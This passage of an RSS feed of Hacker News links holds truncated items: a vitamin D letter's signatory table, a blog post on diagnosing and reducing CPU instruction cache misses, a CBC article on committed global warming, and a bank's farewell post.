rowspan="1"><p><span>4000 IU</span></p></td><td colspan="1" rowspan="1"></td></tr><tr><td colspan="1" rowspan="1"><p><span>Dr. Susan J Whiting</span><span>, PhD. Professor Emerita, University of Saskatchewan, Canada.</span></p></td><td colspan="1" rowspan="1"><p><span>4000 IU</span></p></td><td colspan="1" rowspan="1"><p><span>4000 IU</span></p></td></tr><tr><td colspan="1" rowspan="1"><p><span>Dr. Richard Mazess</span><span>. PhD. Emeritus Professor, University of Wisconsin, Madison, USA.</span></p></td><td colspan="1" rowspan="1"><p><span>4000 IU</span></p></td><td colspan="1" rowspan="1"><p><span>5000 IU</span></p></td></tr><tr><td colspan="1" rowspan="1"><p><span>Dr. Helga Rhein</span><span>, MD (retired). </span><span>Sighthill…</span></p></td></tr></tbody></div></div>
<br/><p><em>Article truncated for RSS feed. Read the full article at <a href="https://vitamindforall.org/letter.html">https://vitamindforall.org/letter.html</a></em></p>]]>
            </description>
            <link>https://vitamindforall.org/letter.html</link>
            <guid isPermaLink="false">hacker-news-small-sites-25680282</guid>
            <pubDate>Fri, 08 Jan 2021 01:34:32 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[Avoiding instruction cache misses (2019)]]>
            </title>
            <description>
<![CDATA[
Score 67 | Comments 17 (<a href="https://news.ycombinator.com/item?id=25680125">thread link</a>) | @nkurz
<br/>
January 7, 2021 | https://paweldziepak.dev/2019/06/21/avoiding-icache-misses/ | <a href="https://web.archive.org/web/*/https://paweldziepak.dev/2019/06/21/avoiding-icache-misses/">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div><div role="main"><div><article><p>Modern processors are quite complex, with many parts having the potential to become a bottleneck. It is relatively easy to reason about the performance of short pieces of code, especially if memory effects are kept to a minimum. Both static analysis tools like LLVM MCA and microbenchmarks can provide a lot of information in such cases. However, the behaviour of the whole program is not just the sum of those small parts. As the code becomes larger and more complex other effects start appearing. One of such potential problems are excessive instruction cache misses.</p><p>Every program has different properties, and those large-scale effects will affect it differently. However, if its job is to execute complex logic on a small amount of data, the instruction cache is likely to become a problem at some point. The actual impact may vary significantly from codebase to codebase, which is why I won’t show any numbers in this article. Let’s consider this just a collection of ideas, but it is not easy to tell how much any of them will help for a given application.</p><p>First, let’s have a quick look at the processor front end. Below is a simplified diagram of how it is arranged in Skylake, the numbers between units are the maxima per cycle.</p><p><img loading="lazy" width="630" height="860" src="https://paweldziepak.dev/static/icache-front-end.min.2e73578fff.svg" alt="CPU front end"></p><p>Each cycle the processor fetches up to 16 bytes from the instruction cache using information from the Branch Prediction Unit to predict the control flow. The pre-decode unit determines instruction lengths and puts up to five of them in the Instruction Queue. From the Instruction Queue, up to 5 instructions (with macro-fusion) are brought each cycle to the decoders. There is one complex decoder that can handle instructions that translate to up to 4 µops and 3 simple decoders that can handle only single-µop instructions. In total, all decoders are limited to producing no more than 5 µops each cycle. Instructions that require more than 4 µops go through Microcode Sequence ROM, which emits 4 µops per cycle, and while it is active, the decoders are disabled. There is also Decoded ICache (<abbr title="Decoded Stream Buffer">DSB</abbr>) which caches decoded µops. It can emit up to 6 µops each cycle. All µops, regardless of their source, end up in the Instruction Decode Queue (IDQ). The Loop Stream Detector (LSD) detects small loops and keeps them in the queue, so that no fetched, decodes or reads from the DSB are needed during the duration of the loop. IDQ is the last part of the front end, and the queued µops continue to the back end.</p><p>From the instruction cache point of view, the front end has two weaknesses. Firstly, instructions are processed in-order which can severely limit the processor ability to hide latencies of cache misses. HyperThreading can make sure that this part of the processor still does some useful work, but it is also the source of the second problem – all resources, including the L1 instruction cache and µop cache are shared between the hardware threads.</p><p>Modern processors provide various metrics that help monitor their behaviour. However, the task of extracting the relevant data requires a proper approach if it is to be done efficiently. Top-down analysis is invaluable with helping to understand microarchitectural phenomena in large codebases. The idea is to monitor program behaviour with the <abbr title="Performance Monitoring Unit">PMU</abbr> counters and identify the bottleneck starting with the major functional parts of the CPU and then digging deeper narrowing down on the exact source of the problem. It can be done in an automated way by tools like VTune or toplev.</p><pre><code>FE    Frontend_Bound:                                      39.48 +-  0.00 % Slots
BE    Backend_Bound:                                       16.19 +-  0.00 % Slots
    This category represents fraction of slots where no uops are
    being delivered due to a lack of required resources for
    accepting new uops in the Backend...
FE    Frontend_Bound.Frontend_Latency:                     24.92 +-  0.00 % Slots
FE    Frontend_Bound.Frontend_Bandwidth:                   13.45 +-  0.00 % Slots
FE    Frontend_Bound.Frontend_Latency.ICache_Misses:       14.45 +-  0.00 % Clocks &lt;==
    This metric represents fraction of cycles the CPU was
    stalled due to instruction cache misses...
    Sampling events:  frontend_retired.l2_miss:pp frontend_retired.l1i_miss:pp
FE    Frontend_Bound.Frontend_Latency.ITLB_Misses:          8.71 +-  0.00 % Clocks
    This metric represents fraction of cycles the CPU was
    stalled due to instruction TLB misses...
    Sampling events:  frontend_retired.stlb_miss:pp frontend_retired.itlb_miss:pp
FE    Frontend_Bound.Frontend_Latency.Branch_Resteers:      8.42 +-  0.00 % Clocks_Est
    This metric represents fraction of cycles the CPU was
    stalled due to Branch Resteers...
    Sampling events:  br_misp_retired.all_branches:u
FE    Frontend_Bound.Frontend_Bandwidth.MITE:              31.93 +-  0.00 % CoreClocks
    This metric represents Core fraction of cycles in which CPU
	was likely limited due to the MITE pipeline (Legacy Decode
    Pipeline)...
</code></pre><p>Above is an example of a toplev result. We can see that the instruction cache misses were the dominating bottleneck. Unsurprisingly instruction TLB misses also show up. On the front end bandwidth side of things, toplev points to the legacy decode pipeline. That makes perfect sense if the instructions are supplied from DSB or LSD, then there are no instruction fetches, and no cache misses.</p><p>Sometimes, the final summary may not provide sufficient information if there are changes in the code behaviour during the test. When that’s the case, a graph is likely to be a much more helpful way of presenting the results.</p><p><img loading="lazy" width="950" height="950" src="https://paweldziepak.dev/static/icache-toplev.min.2b465fdb6f.svg" alt="toplev"></p><p>Tools like toplev are great for initial identification of the problem, but once that’s done what we need is a right way for comparing different solutions. Ultimately, the most important metric is the actual performance of the program in a real-life workload. toplev still can be helpful as it shows the balance between different performance-limiting factors. What also can be useful is <code>perf stat</code> which can show the performance counter statistics. The event most relevant for us is <code>L1-icache-load-misses</code>, though there are more model-specific registers that may be of interest.</p><p>Now, that we know how to diagnose excessive instruction cache misses, let’s see what can be done to deal with this problem.</p><h2 id="avoiding-work">Avoiding work</h2><p>If the number of executed instructions is the problem, the most obvious solution is to try to reduce that number. Obviously, that’s much easier said than done, but there are some common patterns for dealing with this issue. One example would be prepared statements in databases. The general idea is that if a client knows it will send requests that have some commonality, it can tell the database engine early that the requests are going to match specific templates. This information allows the server to do as much work as possible during the preparation stage, thus reducing the amount of logic that needs to be executed for each individual request.</p><p>Extracting common patterns doesn’t have to be explicit. A server or any other kind of an application which actions depend on the user input could attempt to look for repeating patterns and cache some common parts. This is a very vague idea and most likely won’t be easily implementable in a lot of applications, but in some cases may be quite a natural solution. It also shows the main problem with the “just do less” approach – it is very application specific. On the plus, side, if this can be done, it is likely to help with the overall performance, not just the instruction cache misses.</p><p>Another potential problem is making sure that the preparation phase can really do something to help during the execution phase. If that means pre-computing some values, then it’s simple. However, if the only thing that preparation gives us is the knowledge which code paths are going to be exercised and which branches taken during the execution, it is going to be harder to take benefit from it. One option is to have some specialised code for the most common paths, C++ templates may come in handy here. If it is not easy to determine what may be the most common paths, then a just-in-time compiler may be used to generate code in the preparation stage.<sup id="fnref:1"><a href="#fn:1" role="doc-noteref">1</a></sup></p><h2 id="batching-work">Batching work</h2><p>So far, we have been trying to reduce the number of executed instructions, by taking advantage of some earlier knowledge to avoiding repeating the same work. In other words, we have introduced two stages:</p><ul><li>preparation, which is performed rarely and, consequently, less performance critical</li><li>execution, which is done many times and is expected to dominate overall performance</li></ul><p>The way this can help with the instruction cache misses is that the execution stage, being smaller, is more likely to fit in the instruction cache. Whether this brings any measurable benefits depends highly on the type of the application and how much logic can be moved from execution to preparation stages.</p><p>We have already split our processing pipeline into preparation and execution stage. If the execution stage can fit in the instruction cache, we are done. However, often, that’s not the case. What we can do to improve the situation more is to split the execution into more stages. This time the goal is not to reuse work as it was with the preparation, but to group entities that need to have the same code executed for them. In other words, if the processing pipeline consists of steps A, B and C the idea is to separate them, add a queue in front of each of those stages, and then cycle through those stages each time handling multiple elements from the queue. Connections between the stages don’t have to be one-to-one, any directed graph is fine.</p><p><img loading="lazy" width="756" height="331" src="https://paweldziepak.dev/static/icache-seda.min.7259b25adc.svg" alt="SEDA diagram"></p><p>In the diagram above, there is one stage that feeds tasks to one of two stages. This could be, for example, a front-end of a database server. The first stage does some initial request processing and then, depending on whether it is a read or write, puts it in the appropriate queue. Each stage processes requests in batches, the first one warms up the instruction …</p></article></div></div></div></div>
<br/><p><em>Article truncated for RSS feed. Read the full article at <a href="https://paweldziepak.dev/2019/06/21/avoiding-icache-misses/">https://paweldziepak.dev/2019/06/21/avoiding-icache-misses/</a></em></p>]]>
            </description>
            <link>https://paweldziepak.dev/2019/06/21/avoiding-icache-misses/</link>
            <guid isPermaLink="false">hacker-news-small-sites-25680125</guid>
            <pubDate>Fri, 08 Jan 2021 01:15:55 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[CO2 already emitted will warm Earth beyond climate targets, study finds]]>
            </title>
            <description>
<![CDATA[
Score 332 | Comments 241 (<a href="https://news.ycombinator.com/item?id=25679618">thread link</a>) | @colinprince
<br/>
January 7, 2021 | https://www.cbc.ca/news/technology/climate-targets-1.5861537 | <a href="https://web.archive.org/web/*/https://www.cbc.ca/news/technology/climate-targets-1.5861537">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><p>The amount of baked-in global warming, from carbon pollution already in the air, is enough to blow past international agreed upon goals to limit climate change, a new study finds. But it can be delayed for centuries if governments takes action.</p><div><figure><div><p><img loading="lazy" alt="" srcset="" sizes="" src="https://i.cbc.ca/1.4922800.1543350548!/cpImage/httpImage/image.jpg_gen/derivatives/16x9_780/us-coal-s-decline.jpg"></p></div><figcaption>Smoke and steam rise from the smokestack of a coal-fired power plant near Ordos in northern China's Inner Mongolia Autonomous Region in 2015.  A new study estimates that 2.3 C of warming is inevitable, but can be delayed for centuries if the world quickly stops emitting extra greenhouse gases from the burning of coal, oil and natural gas, the study's authors say.<!-- --> <!-- -->(Mark Schiefelbein/Associated Press)</figcaption></figure><p><span><p>The amount of baked-in global warming, from carbon pollution already in the air, is enough to blow past international agreed upon goals to limit climate change, a new study finds.</p>  <p>But it's not game over because, while that amount of warming may be inevitable, it can be delayed for centuries if the world quickly stops emitting extra greenhouse gases from the burning of coal, oil and natural gas, the study's authors say.</p>  <p>For decades, scientists have talked about so-called "committed warming" or the increase in future temperature based on past carbon dioxide emissions that stay in the atmosphere for well over a century. It's like the distance a speeding car travels after the brakes are applied.</p>  <p>But Monday's <a href="https://www.nature.com/articles/s41558-020-00955-x">study in the journal Nature Climate Change</a> calculates that a bit differently and now figures the carbon pollution already put in the air will push global temperatures to about 2.3 degrees Celsius (4.1 degrees Fahrenheit) of warming since pre-industrial times.</p>  <p>Previous estimates, including those accepted by international science panels, were about a degree Celsius (1.8 degrees Fahrenheit) less than that amount of committed warming.</p>  <p>International climate agreements set goals of limiting warming to 2 C&nbsp;(3.6 F) since pre-industrial times, with the more ambitious goal of limiting it to 1.5 C&nbsp;(2.7 F) added in Paris in 2015. The world has already warmed about 1.1 C&nbsp;(2 F).</p>  <p>"You've got some ... global warming inertia that's going to cause the climate system to keep warming, and that's essentially what we're calculating," said study co-author Andrew Dessler, a climate scientist at Texas A&amp;M University. "Think about the climate system like the Titanic. It's hard to turn the ship when you see the icebergs."</p>  <p>Dessler and colleagues at the Lawrence Livermore National Lab and Nanjing University in China calculated committed warming to take into account that the world has warmed at different rates in different places and that places that haven't warmed as fast are destined to catch up.</p>    <p>Places such as the Southern Ocean, surrounding Antarctica are a bit cooler, and that difference creates low-lying clouds that reflect more sun away from earth, keeping these places cooler. But this situation can't keep going indefinitely because physics dictates that cooler locations will warm up more and when they do, the clouds will dwindle and more heating will occur, Dessler said.</p>  <p>Previous studies were based on the cooler spots staying that way, but Dessler and colleagues say that's not likely.</p>  <p><span><figure><div><p><img loading="lazy" alt="" srcset="https://i.cbc.ca/1.5693652.1597940952!/cpImage/httpImage/image.jpg_gen/derivatives/original_300/greenland-record-melt.jpg 300w,https://i.cbc.ca/1.5693652.1597940952!/cpImage/httpImage/image.jpg_gen/derivatives/original_460/greenland-record-melt.jpg 460w,https://i.cbc.ca/1.5693652.1597940952!/cpImage/httpImage/image.jpg_gen/derivatives/original_620/greenland-record-melt.jpg 620w,https://i.cbc.ca/1.5693652.1597940952!/cpImage/httpImage/image.jpg_gen/derivatives/original_780/greenland-record-melt.jpg 780w,https://i.cbc.ca/1.5693652.1597940952!/cpImage/httpImage/image.jpg_gen/derivatives/original_1180/greenland-record-melt.jpg 1180w" sizes="(max-width: 300px) 300px,(max-width: 460px) 460px,(max-width: 620px) 620px,(max-width: 780px) 780px,(max-width: 1180px) 1180px" src="https://i.cbc.ca/1.5693652.1597940952!/cpImage/httpImage/image.jpg_gen/derivatives/original_780/greenland-record-melt.jpg"></p></div><figcaption>In this Aug. 16, 2019 file photo, icebergs float away as the sun rises near Kulusuk, Greenland. Greenland lost a record amount of ice that year. The world has already warmed 1.1 C since pre-industrial times.<!-- --> <!-- -->(Felipe Dana/The Associated Press)</figcaption></figure></span></p>  <h2>More research needed, outside experts say</h2>  <p>Outside experts said the work is based on compelling reasoning, but want more research to show that it's true. Breakthrough Institute climate scientist Zeke Hausfather said the new work fits better with climate models than observational data.</p>  <p>Just because the world is bound to get more warming than international goals, that doesn't mean all is lost in the fight against global warming, said Dessler, who cautioned against what he called "climate doomers."</p>  <p>If the world gets to net zero carbon emissions soon, 2 degrees of global warming could be delayed enough so that it won't happen for centuries, giving society time to adapt or even come up with technological fixes, he said.</p>  <p>"If we don't, we're going to blow through (climate goals) in a few decades," Dessler said. "It's really the rate of warming that makes climate change so terrible. If we got a few degrees over 100,000 years, that would not be that big a deal. We can deal with that. But a few degrees over 100 years is really bad."</p></span></p></div></div>]]>
            </description>
            <link>https://www.cbc.ca/news/technology/climate-targets-1.5861537</link>
            <guid isPermaLink="false">hacker-news-small-sites-25679618</guid>
            <pubDate>Fri, 08 Jan 2021 00:23:20 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[Go Forth and Azlo]]>
            </title>
            <description>
<![CDATA[
Score 2 | Comments 0 (<a href="https://news.ycombinator.com/item?id=25679475">thread link</a>) | @Seich
<br/>
January 7, 2021 | https://www.azlo.com/blog/go-forth-and-azlo | <a href="https://web.archive.org/web/*/https://www.azlo.com/blog/go-forth-and-azlo">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div>
  <div>
    <div>
      <div>
        
      
        <div>
          
          <p><span id="hs_cos_wrapper_post_body" data-hs-cos-general-type="meta_field" data-hs-cos-type="rich_text"><p><img src="https://www.azlo.com/hs-fs/hubfs/blog-Azlo%20farewell-lg.jpg?width=876&amp;name=blog-Azlo%20farewell-lg.jpg" alt="blog-Azlo farewell-lg" width="876" srcset="https://www.azlo.com/hs-fs/hubfs/blog-Azlo%20farewell-lg.jpg?width=438&amp;name=blog-Azlo%20farewell-lg.jpg 438w, https://www.azlo.com/hs-fs/hubfs/blog-Azlo%20farewell-lg.jpg?width=876&amp;name=blog-Azlo%20farewell-lg.jpg 876w, https://www.azlo.com/hs-fs/hubfs/blog-Azlo%20farewell-lg.jpg?width=1314&amp;name=blog-Azlo%20farewell-lg.jpg 1314w, https://www.azlo.com/hs-fs/hubfs/blog-Azlo%20farewell-lg.jpg?width=1752&amp;name=blog-Azlo%20farewell-lg.jpg 1752w, https://www.azlo.com/hs-fs/hubfs/blog-Azlo%20farewell-lg.jpg?width=2190&amp;name=blog-Azlo%20farewell-lg.jpg 2190w, https://www.azlo.com/hs-fs/hubfs/blog-Azlo%20farewell-lg.jpg?width=2628&amp;name=blog-Azlo%20farewell-lg.jpg 2628w" sizes="(max-width: 876px) 100vw, 876px"></p>
<p><strong>By Cameron Peake</strong></p>
<!--more-->
<div><p>You may have heard by now that BBVA US, Azlo’s parent bank, has made the strategic decision to <a href="https://www.azlo.com/blog/azlo-status-update"><span>close Azlo’s business</span></a>. After more than four years dedicated to building unparalleled digital banking services for founders, freelancers, and small business owners, we still firmly believe in our vision: giving every small business owner the opportunity to survive and thrive.</p><p>As founders and entrepreneurs ourselves, we know that there can always be unexpected bumps on the entrepreneurial journey, and we’re sorry that we won’t be alongside our inspiring community of entrepreneurs as they grow and flourish.&nbsp;</p><p>In creating Azlo, we worked hard every day to give entrepreneurs and small business owners a helping hand whenever they needed it — whether that was through offering a free online bank account, bringing innovative features like digital Envelopes to life, or hosting informative webinars featuring industry-leading experts. Wherever we could, we wanted to level the playing field and help founders from all walks of life have their best chance at success.</p><p>I’ve been encouraged at the progress that has been made recently, even in the face of a pandemic and a mounting sense of economic uncertainty. The Black Lives Matter movement gave long-deserved and widespread recognition to Black entrepreneurs and encouraged many consumers to seek out and support their businesses. We have been proud to showcase our customers’ businesses — as we did with our <a href="https://www.azlo.com/customers-catalog/"><span>Customer Shopping Catalog</span></a> — and help entrepreneurs learn from each other through the <a href="https://www.azlo.com/blog/category/entrepreneurs/"><span>stories</span></a> you told us.</p><p>This has been a journey we’ve been privileged to be on with all of you. Thank you for being part of our community, to propel us forward, and make us a better business. To our founders, our innovators, and our supporters — you are what makes this world great.&nbsp;</p><p>On a closing note, many ask what “Azlo” means. It’s a play on “<em>Hazlo,</em>” which means “get it done” in Spanish. This phrase to us is the essence of entrepreneurship <span>—</span> you push through the blood, sweat, and tears to reach your goal in whatever way possible. So, to our community:<span>&nbsp;</span><em>Hazlo</em> <span>— </span>we can’t wait to see what you’ll achieve.</p></div></span>
        </p></div>
        
        
        
        <hr>
        
        
        
        
        
        
        <hr>
        <p><a href="https://www.azlo.com/blog"><img src="https://www.azlo.com/hubfs/raw_assets/public/Azlo_July2020_v2/images/icon-arrow-left.svg" alt="Icon arrow left">Back to Blog</a>
      </p></div>  
    </div>
  </div>
  
  
  
</div></div>]]>
            </description>
            <link>https://www.azlo.com/blog/go-forth-and-azlo</link>
            <guid isPermaLink="false">hacker-news-small-sites-25679475</guid>
            <pubDate>Fri, 08 Jan 2021 00:03:54 GMT</pubDate>
        </item>
    </channel>
</rss>
